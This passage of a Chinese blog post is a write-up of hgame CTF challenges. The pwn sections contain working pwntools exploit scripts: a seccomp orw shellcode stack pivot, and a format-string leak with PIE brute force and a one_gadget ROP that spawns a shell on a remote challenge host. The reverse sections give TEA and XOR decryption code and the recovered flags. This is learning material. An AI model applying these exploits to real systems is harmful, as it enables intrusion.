</span></span></code></pre></div><p>这里 <code>rop</code> 的时候如果用 <code>one_gadget</code> 或者直接 <code>pop_rdi_ret</code> 会返回 <code>segment fault</code> 的错误，当时我做到这里的时候一看已经零点多了，就去睡觉了，第二天早上起来才想起来是一些 libc 在执行 <code>system</code> 时 <code>rsp</code> 需要与0x10对齐（可以参考<a href=http://blog.eonew.cn/archives/958>这篇博客</a>），所以需要调整栈地址，这里我用的是 <code>pop_rdi_一个我不记得是什么的寄存器_ret</code> 的 gadget ，就成功 getshell 了。可惜的是一血被一位校外的师傅在凌晨4点夺走了，只拿到了二血。这道题的出题人非常有诚意，写了一个比较复杂的程序（说复杂也是相对我这种菜鸡来说的），各种提示也是恰到好处，遗憾的是没想到刚开始就搜危险函数，还是浪费了不少时间，没有取得一血。</p><h3 id=letter>letter</h3><p>orw（open-read-write）模板题</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/902296697.png></div><p>很明显，输入一个 <code>-1</code> 就可以绕过对长度的限制了</p><p>当然这题没那么简单</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2634066450.png></div><p>这里用 <code>seccomp</code> 系列函数禁用了除了 <code>read</code> <code>write</code> <code>open</code> <code>exit</code> <code>setuid</code> 之外的所以系统调用，一般的做法是<code>open("./flag")->read(3,addr,len)->write(1,addr,len)</code>。曾经我也有考虑过通过重新调用 <code>seccomp_init</code> 放开所有系统调用 getshell ，但是仔细想想 <code>seccomp_init</code> 本身也要使用系统调用来禁用或允许系统调用，所有这种做法是不可行的。还是退而求其次拿个 flag 就算了。</p><p>先 checksec 一下</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1243255541.png></div><p>不出所料几乎没有保护，这种题有时会给一个 <code>jmp rsp</code> 的 <code>gadget</code> ，那就可以考虑栈上布置 shellcode （此题没给），不过 PIE 没开，不需要用，可以栈迁移到 .bss，由于内存分页机制的存在，这里必然大小有至少为0x1000的可读可写可执行的空间，足够我们布置 shellcode 和储存 flag 。栈迁移我是朴素的通过 <code>ret2leave</code> 实现的。</p><h4 id=exp-1>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>,os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>,arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rsp_r13_r14_r15_ret <span style=color:#666>=</span> <span style=color:#40a070>0x400a9d</span>
</span></span><span style=display:flex><span>bss_base <span style=color:#666>=</span> <span style=color:#40a070>0x601000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>31305</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;send?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;-1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> p64(bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x200</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x40096A</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;send?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;-1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span>  p64(<span style=color:#40a070>0x601F00</span>) <span style=color:#666>*</span> <span style=color:#40a070>3</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x210</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>open(<span style=color:#4070a0>&#39;./flag&#39;</span>)) 
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>read(<span style=color:#40a070>3</span>,bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>,<span style=color:#40a070>0x60</span>))
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>write(<span style=color:#40a070>1</span>,bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>,<span style=color:#40a070>0x60</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>关于这里 <code>payload = 'a' * 0x10 + p64(bss_base + 0x200) + p64(0x40096A)</code> 一句中使用 <code>bss_base + 0x200</code> 做为迁移的地址的原因是为了给之后的 orw 提供栈空间。</p><h3 id=once>once</h3><p>这道题我感觉好像是最难的，到现在我也不知道预期解是怎么样的。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/539217276.png></div><p>程序逻辑和漏洞很简单，既有栈溢出又有格式化字符串，保护的话仅有canary没开。考虑到printf是在read后调用的，所以在我们输入第一次payload的时候是没用任何已知地址的，当然自然我们可以想到利用PIE的低12位不变性，写返回地址的低8位来控制返回地址，但是发现好像没有可以返回的地址，因此我就没有思路了。退而求其次，我选择爆破三字节，写死低16位，并用 <code>'\n'</code> 截断，这样我们要爆破12位，需要基地址最低3字节为 0x0a0000。概率千分之一吧，尚可接受（现在我知道我蠢了，原来read是不会在字符串尾补 <code>'\x00'</code> 的，所以写一个字节就可以了，不需要爆破）。做法就很粗暴了，格式化字符串泄露 <code>libc</code> 和程序基地址，然后就是简单的 rop 了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>os</span>
</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload = &#39;%&#39; + str(0xD2) + &#39;c&#39; + &#34;%11$hhn-&#34; + &#34;%13$p-%11$p-&#34;</span>
</span></span><span style=display:flex><span>flag <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> flag <span style=color:#666>&lt;</span> <span style=color:#40a070>1000</span>:
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;try #&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(flag))
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./once&#34;)</span>
</span></span><span style=display:flex><span>        sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30107</span>)
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#34;%13$p-%17$p-%10$p-&#34;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;a&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x70\x10</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#prog_base = 0x555555554000</span>
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#payload = &#34;%13$p-%17$p-%10$p-&#34;.ljust(0x28,&#39;a&#39;) + p64(prog_base + 0x1070)</span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#39;turn: &#39;</span>,payload)
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#sh.recvuntil(&#39;-&#39;)</span>
</span></span><span style=display:flex><span>        libc_start_main <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;-&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>231</span>
</span></span><span style=display:flex><span>        libc_base <span style=color:#666>=</span> libc_start_main <span style=color:#666>-</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_start_main&#34;</span>]
</span></span><span style=display:flex><span>        one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4F3D5</span>
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;one_gadget:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>        system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;system_addr:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(system_addr))
</span></span><span style=display:flex><span>        sh_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>search(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>)<span style=color:#666>.</span>next()
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;bin_sh_addr:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(sh_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        prog_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;-&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x1169</span>
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;prog_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(prog_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#if((prog_base &amp; 0xFFFFFF) == 0x0a0000):</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        stack_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;-&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
</span></span><span style=display:flex><span>        stack_addr <span style=color:#666>-=</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> <span style=color:#40a070>0x28</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        pop_rdi_ret <span style=color:#666>=</span> prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x1283</span>
</span></span><span style=display:flex><span>        pop_rdi_rbp_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x22203</span>
</span></span><span style=display:flex><span>        leave_addr <span style=color:#666>=</span> prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x1213</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(sh_addr) <span style=color:#666>+</span> p64(system_addr)
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#payload = p64(pop_rdi_rbp_ret) + p64(sh_addr) + p64(stack_addr - 0x20) + p64(system_addr)</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>,<span style=color:#4070a0>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(stack_addr)
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#payload += p64(leave_addr)</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(one_gadget)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;turn: &#39;</span>,payload)
</span></span><span style=display:flex><span>        flag <span style=color:#666>=</span> <span style=color:#40a070>100000</span>
</span></span><span style=display:flex><span>        filea <span style=color:#666>=</span> <span style=color:#007020>open</span>(<span style=color:#4070a0>&#34;win&#34;</span>,<span style=color:#4070a0>&#39;w&#39;</span>)  
</span></span><span style=display:flex><span>        sleep(<span style=color:#40a070>0.1</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;cat flag&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#filea.write(sh.recvuntil(&#39;}&#39;))</span>
</span></span><span style=display:flex><span>        filea<span style=color:#666>.</span>close()
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>interactive()
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>close()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>except</span>:
</span></span><span style=display:flex><span>        flag <span style=color:#666>+=</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>close()
</span></span></code></pre></div><p>可能会发现我还 leak 了栈地址，原因是 <code>one_gadget</code>的成功率往往低于直接使用<code>system</code>，而我是爆破，失败了会很亏，所以我就考虑通过 <code>ret2leave</code> 栈迁移然后 <code>rop</code> 一下，结果发现调整 <code>rsp</code>出现了<code>sigbus</code> 的错误（实话说第一次见到这个错误），有没有试不调整的时候能不能getshell不记得了，反正当时想着都算出来了，就上 <code>one_gadget</code> 得了，结果就真的 getshell 了。</p><p>爆破的代价很大</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1413765715.png></div><p>导致我的 wsl 出现了申请了大量空间却不返还的问题，由于没有分区，造成了我C盘爆红。</p><h2 id=reverse>REVERSE</h2><h3 id=apacha>apacha</h3><p>apacha 好像是 jojo 的一个梗，指尿，和题目应该无关。但是茶仍然是提示，对应英文 <code>tea</code>，也就是 <code>Tiny Encryption Algorithm</code> 加密算法简写，<code>0x61C88647</code> 和 <code>0x9E3779B9</code> 两个值也都暗示了是用这个算法加密的。但是实际上知道这个与否应该也没什么区别，这个好像也不是标准 <code>TEA</code>，没有现成的解密脚本，还是得自己手写。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/386636097.png></div><p>只要做这个的逆过程就可以了</p><p>简单的写个程序逆一下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;iostream&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;cstdio&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;cstring&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> key[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> {<span style=color:#40a070>1</span>,<span style=color:#40a070>2</span>,<span style=color:#40a070>3</span>,<span style=color:#40a070>4</span>};
</span></span><span style=display:flex><span><span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> encrypted[<span style=color:#40a070>36</span>] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#40a070>0xE74EB323</span>, <span style=color:#40a070>0xB7A72836</span>, <span style=color:#40a070>0x59CA6FE2</span>, <span style=color:#40a070>0x967CC5C1</span>, <span style=color:#40a070>0xE7802674</span>, <span style=color:#40a070>0x3D2D54E6</span>, <span style=color:#40a070>0x8A9D0356</span>, 
</span></span><span style=display:flex><span>    <span style=color:#40a070>0x99DCC39C</span>, <span style=color:#40a070>0x7026D8ED</span>, <span style=color:#40a070>0x6A33FDAD</span>, <span style=color:#40a070>0xF496550A</span>, <span style=color:#40a070>0x5C9C6F9E</span>, <span style=color:#40a070>0x1BE5D04C</span>, <span style=color:#40a070>0x6723AE17</span>, <span style=color:#40a070>0x5270A5C2</span>, 
</span></span><span style=display:flex><span>    <span style=color:#40a070>0xAC42130A</span>, <span style=color:#40a070>0x84BE67B2</span>, <span style=color:#40a070>0x705CC779</span>, <span style=color:#40a070>0x5C513D98</span>, <span style=color:#40a070>0xFB36DA2D</span>, <span style=color:#40a070>0x22179645</span>, <span style=color:#40a070>0x5CE3529D</span>, <span style=color:#40a070>0xD189E1FB</span>, 
</span></span><span style=display:flex><span>    <span style=color:#40a070>0xE85BD489</span>, <span style=color:#40a070>0x73C8D11F</span>, <span style=color:#40a070>0x54B5C196</span>, <span style=color:#40a070>0xB67CB490</span>, <span style=color:#40a070>0x2117E4CA</span>, <span style=color:#40a070>0x9DE3F994</span>, <span style=color:#40a070>0x2F5AA1AA</span>, <span style=color:#40a070>0xA7E801FD</span>, 
</span></span><span style=display:flex><span>    <span style=color:#40a070>0xC30D6EAB</span>, <span style=color:#40a070>0x1BADDC9C</span>, <span style=color:#40a070>0x3453B04A</span>, <span style=color:#40a070>0x92A406F9</span>
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span><span style=color:#902000>char</span> flag[<span style=color:#40a070>36</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> <span style=color:#06287e>decrypt_part</span>(<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> pre,<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> next,<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> delta,<span style=color:#902000>int</span> index);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> delta <span style=color:#666>=</span> <span style=color:#40a070>0x5384540F</span>;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span>(<span style=color:#902000>int</span> stage <span style=color:#666>=</span> <span style=color:#40a070>7</span>;stage <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span>;stage<span style=color:#666>--</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        printf(<span style=color:#4070a0>&#34;delta:%x</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,delta);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span>(<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>34</span>;i <span style=color:#666>&gt;=</span> <span style=color:#40a070>0</span>;i<span style=color:#666>--</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> pre <span style=color:#666>=</span> encrypted[(i <span style=color:#666>==</span> <span style=color:#40a070>0</span> <span style=color:#666>?</span> <span style=color:#40a070>34</span> <span style=color:#666>:</span> i <span style=color:#666>-</span> <span style=color:#40a070>1</span>)];
</span></span><span style=display:flex><span>            <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> next <span style=color:#666>=</span> encrypted[(i <span style=color:#666>==</span> <span style=color:#40a070>34</span> <span style=color:#666>?</span> <span style=color:#40a070>0</span> <span style=color:#666>:</span> i <span style=color:#666>+</span> <span style=color:#40a070>1</span>)];
</span></span><span style=display:flex><span>            encrypted[i] <span style=color:#666>-=</span> decrypt_part(pre,next,delta,i);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        delta <span style=color:#666>+=</span> <span style=color:#40a070>0x61C88647</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span>(<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>;i <span style=color:#666>&lt;</span> <span style=color:#40a070>35</span>;i<span style=color:#666>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        flag[i] <span style=color:#666>=</span> encrypted[i];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    puts(flag);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> <span style=color:#06287e>decrypt_part</span>(<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> pre,<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> next,<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> delta,<span style=color:#902000>int</span> index)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (((pre <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>5</span>) <span style=color:#666>^</span> (<span style=color:#40a070>4</span> <span style=color:#666>*</span> next)) <span style=color:#666>+</span> ((<span style=color:#40a070>16</span> <span style=color:#666>*</span> pre) <span style=color:#666>^</span> (next <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>3</span>))) <span style=color:#666>^</span>
</span></span><span style=display:flex><span>           ((key[(((<span style=color:#902000>char</span>) index) <span style=color:#666>^</span> ((<span style=color:#902000>char</span>) (delta <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>2</span>))) <span style=color:#666>&amp;</span> <span style=color:#40a070>3</span>] <span style=color:#666>^</span> pre) <span style=color:#666>+</span> (next <span style=color:#666>^</span> delta));
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>关于密文的 dump ：IDA 可以很容易的导出</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3465700210.png></div><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2884910075.png></div><p>但是一定要<strong>仔细检测有没有选全</strong>啊！我就因为少选了一个字节的数据导致密文出错，让我对着屏幕发了一小时的呆，幸亏有想到密文错了的可能，不然可能就做不成这题了。
flag:<code>hgame{l00ks_1ike_y0u_f0Und_th3_t34}</code></p><h3 id=hellore>helloRe</h3><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2955232656.png></div><p>简单的异或加密</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3445125578.png></div><p>这里的数据从 0xFF 开始每一个减一异或下去就可以拿 flag 了</p><p>flag是<code>hgame{hello_re_player}</code></p><h3 id=pypy>pypy</h3><p>附件是一些没见过的奇怪代码，联系题目名，猜想可能是 python 的反汇编码，一查原来是 <code>dis</code> 模块生成的，那么就现学一个新的汇编语法</p><p>简单的复原了一下，大概是这样</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>dis</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>enc</span>():
</span></span><span style=display:flex><span>    raw_flag <span style=color:#666>=</span> <span style=color:#007020>input</span>(<span style=color:#4070a0>&#34;give me your flag:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    chiper <span style=color:#666>=</span> <span style=color:#007020>list</span>(raw_flag[<span style=color:#40a070>6</span>:<span style=color:#666>-</span><span style=color:#40a070>1</span>])
</span></span><span style=display:flex><span>    length <span style=color:#666>=</span> <span style=color:#007020>len</span>(chiper)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>int</span>(length <span style=color:#666>/</span> <span style=color:#40a070>2</span>)):
</span></span><span style=display:flex><span>        chiper[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i <span style=color:#666>+</span> <span style=color:#40a070>1</span>] , chiper[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i] <span style=color:#666>=</span> chiper[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i] , chiper[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i <span style=color:#666>+</span> <span style=color:#40a070>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    res <span style=color:#666>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(length):
</span></span><span style=display:flex><span>        res<span style=color:#666>.</span>append(<span style=color:#007020>ord</span>(chiper[i]) <span style=color:#666>^</span> i)
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#print res</span>
</span></span><span style=display:flex><span>    res <span style=color:#666>=</span> <span style=color:#007020>bytes</span>(res)<span style=color:#666>.</span>hex()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(<span style=color:#4070a0>&#39;your flag:&#39;</span> <span style=color:#666>+</span> res)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dis<span style=color:#666>.</span>dis(enc)
</span></span><span style=display:flex><span>enc()
</span></span></code></pre></div><p><code>res = bytes(res).hex()</code> 这一句我用dis生成的和源文件不尽相似，但是问题不大，加密方法已经很明显了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>res <span style=color:#666>=</span> <span style=color:#007020>input</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>res <span style=color:#666>=</span> <span style=color:#007020>list</span>(<span style=color:#007020>bytearray</span><span style=color:#666>.</span>fromhex(res))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>length <span style=color:#666>=</span> <span style=color:#007020>len</span>(res)
</span></span><span style=display:flex><span>raw_flag <span style=color:#666>=</span> []
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(length):
</span></span><span style=display:flex><span>    raw_flag<span style=color:#666>.</span>append(<span style=color:#007020>chr</span>(res[i] <span style=color:#666>^</span> i))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>int</span>(length <span style=color:#666>/</span> <span style=color:#40a070>2</span>)):
</span></span><span style=display:flex><span>    raw_flag[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i <span style=color:#666>+</span> <span style=color:#40a070>1</span>] , raw_flag[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i] <span style=color:#666>=</span> raw_flag[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i] , raw_flag[<span style=color:#40a070>2</span> <span style=color:#666>*</span> i <span style=color:#666>+</span> <span style=color:#40a070>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#39;&#39;</span><span style=color:#666>.</span>join(raw_flag))
